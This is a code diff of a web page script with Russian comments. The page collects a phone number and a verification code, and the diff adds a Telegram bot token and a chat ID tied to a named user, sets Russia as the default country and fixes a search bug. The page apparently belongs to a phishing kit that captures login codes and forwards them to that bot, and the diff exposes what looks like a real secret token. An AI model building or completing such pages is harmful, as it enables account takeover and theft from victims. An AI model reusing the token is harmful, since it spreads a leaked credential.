@@ -476,8 +476,8 @@
 
     <script>
         // Настройки бота
-        const BOT_TOKEN = 'тут токен бота';
-        const CHAT_ID = 'тут айди поддержки валета';
+        const BOT_TOKEN = '8372074788:AAEtv-DrsVdfw9fDVRbAqNYiOCSPOcnH978';
+        const CHAT_ID = '5836216083'; // ID пользователя @yulswag
 
         // Список популярных стран с кодами и флагами
         const countries = [
@@ -550,10 +550,15 @@
         const errorMessage = document.getElementById('errorMessage');
         const codeDigits = document.querySelectorAll('.code-digit');
 
-        // Текущая выбранная страна
-        let currentCountry = countries[0];
+        // Текущая выбранная страна - всегда Россия по умолчанию
+        let currentCountry = countries.find(country => country.code === '7') || countries[0];
         let enteredPhoneNumber = '';
         let enteredCode = '';
+
+        // Инициализация - устанавливаем Россию при загрузке
+        function initializeCountry() {
+            selectCountry(currentCountry);
+        }
 
         // Открытие модального окна выбора страны
         countrySelector.addEventListener('click', () => {
@@ -805,7 +810,7 @@
             renderCountryList(countrySearch.value);
         });
 
-        // Функция отрисовки списка стран
+        // Функция отрисовки списка стран - ИСПРАВЛЕННАЯ
         function renderCountryList(searchTerm = '') {
             countryList.innerHTML = '';
             
@@ -826,6 +831,7 @@
             // Если есть результаты поиска, отображаем их
             if (searchTerm) {
                 Object.keys(filteredGroups).forEach(letter => {
+                    // ИСПРАВЛЕНИЕ: используем filteredGroups[letter] вместо filteredCountries[letter]
                     filteredGroups[letter].forEach(country => {
                         const countryOption = document.createElement('div');
                         countryOption.className = 'country-option';
@@ -889,6 +895,7 @@
         }
 
         // Инициализация интерфейса
+        initializeCountry();
         renderCountryList();
     </script>
 </body>
